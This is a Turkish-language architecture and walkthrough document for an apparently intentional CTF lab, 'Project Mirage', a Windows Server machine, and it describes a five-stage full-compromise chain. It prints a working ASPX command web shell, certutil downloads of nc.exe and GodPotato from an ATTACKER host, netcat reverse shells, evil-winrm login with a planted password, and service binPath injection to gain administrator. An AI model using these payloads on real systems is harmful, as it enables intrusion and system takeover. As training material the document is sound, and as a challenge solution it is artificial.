# Project Mirage – Final CTF Mimari Dokümantasyonu

## 1. Lab Mimarisi

Makine:

- **OS:** Windows Server 2022
    
- **Rol:** IIS Web Server
    
- **Domain:** mirage.local (tek makine lab)
    
- **Servisler:**
    
    - IIS
        
    - WinRM
        
    - Custom servis: **MirageBackup**
        

Makinede aşağıdaki kullanıcılar bulunur:

|User|Rol|
|---|---|
|Administrator|sistem yöneticisi|
|svc_metrics|servis hesabı|
|iis apppool\defaultapppool|web uygulama hesabı|

---

# 2. Attack Path (Oyuncunun izlemesi gereken yol)

Toplam **5 aşamalı bir FullPwn zinciri** vardır.

```
1️⃣ File Upload → Web Shell
2️⃣ GodPotato → SYSTEM
3️⃣ Credential Hunting → PowerShell History
4️⃣ WinRM Login (svc_metrics)
5️⃣ Weak Service Permissions → SYSTEM
```

---

# 3. Aşama 1 — Web Upload Vulnerability

Web uygulamasında **yetersiz dosya doğrulaması** bulunan bir upload endpoint vardır.

Oyuncu `.aspx` shell yükleyebilir.

Örnek payload:

```aspx
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (cmd != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe"; 
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

Shell kullanımı:

```
http://target/uploads/shell.aspx?cmd=whoami
```

Sonuç:

```
iis apppool\defaultapppool
```

Bu aşamada oyuncu **low privilege foothold** elde eder.

---

# 4. Aşama 2 — SYSTEM PrivEsc (GodPotato)

Sunucu:

```
Windows Server 2022
```

Bu yüzden oyuncu **GodPotato** kullanabilir.

## Exploit yükleme

Oyuncu kendi makinesinde:

```bash
python3 -m http.server 80
```

Ardından hedefte:

```powershell
certutil -urlcache -f http://ATTACKER/nc.exe c:\windows\temp\nc.exe
certutil -urlcache -f http://ATTACKER/god.exe c:\windows\temp\god.exe
```

Reverse shell başlatma:

```powershell
c:\windows\temp\god.exe -cmd "c:\windows\temp\nc.exe ATTACKER 4444 -e cmd"
```

Attacker makinesinde:

```bash
nc -lvnp 4444
```

Sonuç:

```
nt authority\system
```

Bu noktada oyuncu **SYSTEM shell** alır.

---

# 5. Aşama 3 — Credential Hunting

Sticky Notes yerine credential şu dosyada bırakılmıştır:

```
C:\Users\svc_metrics\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

SYSTEM shell ile oyuncu şu komutu çalıştırır:

```cmd
type C:\Users\svc_metrics\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

İçerikte şu tarz bir komut bulunur:

```
$pass="M1r@g3_M3tr1cs_2026!"
$username="svc_metrics"
```

Bu oyuncuya **credential leak** sağlar.

---

# 6. Aşama 4 — WinRM Pivot

Oyuncu bu bilgileri kullanarak WinRM ile bağlanır.

```bash
evil-winrm -i TARGET -u svc_metrics -p 'M1r@g3_M3tr1cs_2026!'
```

Shell:

```
PS C:\Users\svc_metrics>
```

Burada oyuncu **user.txt** flagini bulur.

```
C:\Users\svc_metrics\Desktop\user.txt
```

---

# 7. Aşama 5 — Insecure Service Permissions

Sistemde şu servis vardır:

```
MirageBackup
```

Servis özellikleri:

```
SERVICE_NAME: MirageBackup
BINARY_PATH_NAME: C:\Program Files\Mirage\MirageAgent.exe
SERVICE_START_NAME: LocalSystem
```

Fakat servis DACL hatalıdır ve **svc_metrics kullanıcısına full control verilmiştir.**

Oyuncu bunu şu komutla keşfedebilir:

```powershell
sc.exe sdshow MirageBackup
```

veya:

```powershell
accesschk.exe -uwcqv svc_metrics MirageBackup
```

---

# 8. BinPath Injection

Oyuncu servis binary yolunu değiştirir.

```powershell
sc.exe config MirageBackup binPath= "cmd.exe /c net localgroup administrators svc_metrics /add"
```

```powershell
sc.exe config MirageBackup binPath= "C:\Temp\nc.exe KALI_IP 4444 -e cmd.exe"
```

```powershell
cd C:\Temp\
upload nc.exe
```



Sonra servisi başlatır:

```powershell
sc.exe start MirageBackup
```

Sonuç:

```
svc_metrics → Administrator
```

---

# 9. Root Flag

Artık admin olan oyuncu:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

Challenge tamamlanır.

---

